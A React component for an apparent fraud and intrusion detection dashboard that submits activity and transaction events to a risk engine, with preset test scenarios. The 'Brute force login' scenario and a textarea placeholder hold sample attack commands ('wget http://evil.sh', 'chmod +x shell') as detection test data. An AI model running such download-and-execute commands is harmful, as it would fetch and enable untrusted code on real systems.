import React, { useState } from 'react';
import { api } from '../api';
import { AlertBadge, ScoreBar, Card, Btn } from './ui';

const ACTIVITY_DEFAULTS = {
  user_id: 'user_42',
  ip_address: '192.168.99.1',
  timestamp: new Date().toISOString().slice(0, 16),
  failed_logins: 0,
  hour_utc: new Date().getUTCHours(),
  commands: [],
};

const TRANSACTION_DEFAULTS = {
  user_id: 'user_42',
  amount: 500,
  currency: 'ZAR',
  device_id: 'device_abc',
  location: 'Johannesburg',
  timestamp: new Date().toISOString().slice(0, 16),
};

const SCENARIOS = [
  {
    label: 'Brute force login',
    type: 'activity',
    data: { user_id: 'attacker_01', ip_address: '10.0.0.99', failed_logins: 8, hour_utc: 2, commands: ['wget http://evil.sh', 'chmod +x shell'] },
  },
  {
    label: 'Suspicious large tx',
    type: 'transaction',
    data: { user_id: 'user_99', amount: 45000, currency: 'ZAR', device_id: 'unknown_device', location: 'Lagos', timestamp: new Date().toISOString().slice(0, 16) },
  },
  {
    label: 'Normal activity',
    type: 'activity',
    data: { user_id: 'alice', ip_address: '10.0.0.1', failed_logins: 0, hour_utc: 9, commands: ['ls', 'git pull'] },
  },
  {
    label: 'Normal transaction',
    type: 'transaction',
    data: { user_id: 'alice', amount: 120, currency: 'ZAR', device_id: 'device_trusted', location: 'Cape Town', timestamp: new Date().toISOString().slice(0, 16) },
  },
];

function Field({ label, children }) {
  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 5 }}>
      <label style={{ fontSize: 11, color: 'var(--muted)', textTransform: 'uppercase', letterSpacing: '0.07em' }}>{label}</label>
      {children}
    </div>
  );
}

function ResultPanel({ result }) {
  if (!result) return null;
  return (
    <Card style={{ borderColor: result.alert_level === 'CRITICAL' ? 'rgba(239,68,68,0.3)' : result.alert_level === 'HIGH' ? 'rgba(249,115,22,0.3)' : 'var(--border)' }}>
      <p style={{ fontSize: 11, color: 'var(--muted)', marginBottom: 12, textTransform: 'uppercase', letterSpacing: '0.07em' }}>Engine response</p>
      <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 12 }}>
        <AlertBadge level={result.alert_level} />
        <div style={{ flex: 1 }}><ScoreBar score={result.risk_score} /></div>
      </div>
      {result.reason_flags?.length > 0 && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: 4, marginBottom: 10 }}>
          {result.reason_flags.map((f, i) => (
            <p key={i} style={{ fontSize: 12, fontFamily: 'var(--font-mono)', color: '#f97316' }}>▶ {f}</p>
          ))}
        </div>
      )}
      <pre style={{ fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--muted)', background: 'var(--bg)', padding: '10px 12px', borderRadius: 4, overflowX: 'auto', border: '1px solid var(--border)' }}>
        {JSON.stringify(result, null, 2)}
      </pre>
    </Card>
  );
}

function ActivityForm() {
  const [form, setForm]     = useState(ACTIVITY_DEFAULTS);
  const [cmds, setCmds]     = useState('');
  const [loading, setLoad]  = useState(false);
  const [result, setResult] = useState(null);
  const [error, setError]   = useState(null);

  const set = (k, v) => setForm(f => ({ ...f, [k]: v }));

  const submit = async () => {
    setLoad(true); setError(null); setResult(null);
    try {
      const payload = { ...form, commands: cmds.split('\n').map(s => s.trim()).filter(Boolean) };
      const res = await api.postActivity(payload);
      setResult(res);
    } catch (e) { setError(e.message); }
    setLoad(false);
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
        <Field label="User ID"><input value={form.user_id} onChange={e => set('user_id', e.target.value)} /></Field>
        <Field label="IP address"><input value={form.ip_address} onChange={e => set('ip_address', e.target.value)} /></Field>
        <Field label="Failed logins">
          <input type="number" min="0" value={form.failed_logins} onChange={e => set('failed_logins', +e.target.value)} />
        </Field>
        <Field label="Hour UTC (0–23)">
          <input type="number" min="0" max="23" value={form.hour_utc} onChange={e => set('hour_utc', +e.target.value)} />
        </Field>
      </div>
      <Field label="Commands (one per line)">
        <textarea rows={3} value={cmds} onChange={e => setCmds(e.target.value)} placeholder="ls&#10;git pull&#10;wget http://evil.sh" style={{ resize: 'vertical' }} />
      </Field>
      {error && <p style={{ color: '#ef4444', fontSize: 12, fontFamily: 'var(--font-mono)' }}>{error}</p>}
      <Btn variant="primary" onClick={submit} disabled={loading}>{loading ? 'Submitting…' : 'Submit activity event'}</Btn>
      <ResultPanel result={result} />
    </div>
  );
}

function TransactionForm() {
  const [form, setForm]     = useState(TRANSACTION_DEFAULTS);
  const [loading, setLoad]  = useState(false);
  const [result, setResult] = useState(null);
  const [error, setError]   = useState(null);

  const set = (k, v) => setForm(f => ({ ...f, [k]: v }));

  const submit = async () => {
    setLoad(true); setError(null); setResult(null);
    try {
      const res = await api.postTransaction(form);
      setResult(res);
    } catch (e) { setError(e.message); }
    setLoad(false);
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
        <Field label="User ID"><input value={form.user_id} onChange={e => set('user_id', e.target.value)} /></Field>
        <Field label="Device ID"><input value={form.device_id} onChange={e => set('device_id', e.target.value)} /></Field>
        <Field label="Amount">
          <input type="number" min="0" value={form.amount} onChange={e => set('amount', +e.target.value)} />
        </Field>
        <Field label="Currency">
          <select value={form.currency} onChange={e => set('currency', e.target.value)}>
            {['ZAR','USD','EUR','GBP','NGN'].map(c => <option key={c}>{c}</option>)}
          </select>
        </Field>
        <Field label="Location"><input value={form.location} onChange={e => set('location', e.target.value)} /></Field>
        <Field label="Timestamp"><input type="datetime-local" value={form.timestamp} onChange={e => set('timestamp', e.target.value)} /></Field>
      </div>
      {error && <p style={{ color: '#ef4444', fontSize: 12, fontFamily: 'var(--font-mono)' }}>{error}</p>}
      <Btn variant="primary" onClick={submit} disabled={loading}>{loading ? 'Submitting…' : 'Submit transaction event'}</Btn>
      <ResultPanel result={result} />
    </div>
  );
}

export default function SubmitEvent() {
  const [tab, setTab]           = useState('activity');
  const [loadScenario, setLoad] = useState(null);
  const [result, setResult]     = useState(null);
  const [error, setError]       = useState(null);

  const runScenario = async (s) => {
    setLoad(s.label); setError(null); setResult(null);
    try {
      const fn = s.type === 'activity' ? api.postActivity : api.postTransaction;
      const res = await fn(s.data);
      setResult({ scenario: s.label, ...res });
    } catch (e) { setError(e.message); }
    setLoad(null);
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '1.5rem' }}>
      <Card>
        <p style={{ fontSize: 11, color: 'var(--muted)', textTransform: 'uppercase', letterSpacing: '0.07em', marginBottom: 10 }}>Quick scenarios</p>
        <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
          {SCENARIOS.map(s => (
            <button key={s.label} onClick={() => runScenario(s)} disabled={loadScenario === s.label} style={{
              padding: '7px 14px', borderRadius: 4, fontSize: 12, fontFamily: 'var(--font-mono)',
              background: 'var(--bg-hover)', border: '1px solid var(--border-em)', color: 'var(--text)',
              cursor: 'pointer', opacity: loadScenario === s.label ? 0.5 : 1,
            }}>
              {loadScenario === s.label ? '…' : s.label}
              <span style={{ marginLeft: 6, fontSize: 10, color: 'var(--muted)' }}>[{s.type}]</span>
            </button>
          ))}
        </div>
        {error  && <p style={{ color: '#ef4444', fontSize: 12, fontFamily: 'var(--font-mono)', marginTop: 10 }}>{error}</p>}
        {result && <ResultPanel result={result} />}
      </Card>

      <Card>
        <div style={{ display: 'flex', gap: 4, marginBottom: '1.25rem' }}>
          {['activity', 'transaction'].map(t => (
            <button key={t} onClick={() => setTab(t)} style={{
              padding: '6px 14px', borderRadius: 4, fontSize: 12, fontFamily: 'var(--font-mono)',
              background: tab === t ? 'var(--accent)' : 'var(--bg-hover)',
              color: tab === t ? '#fff' : 'var(--muted)',
              border: '1px solid var(--border-em)', cursor: 'pointer',
            }}>{t}</button>
          ))}
        </div>
        {tab === 'activity'    ? <ActivityForm    /> : <TransactionForm />}
      </Card>
    </div>
  );
}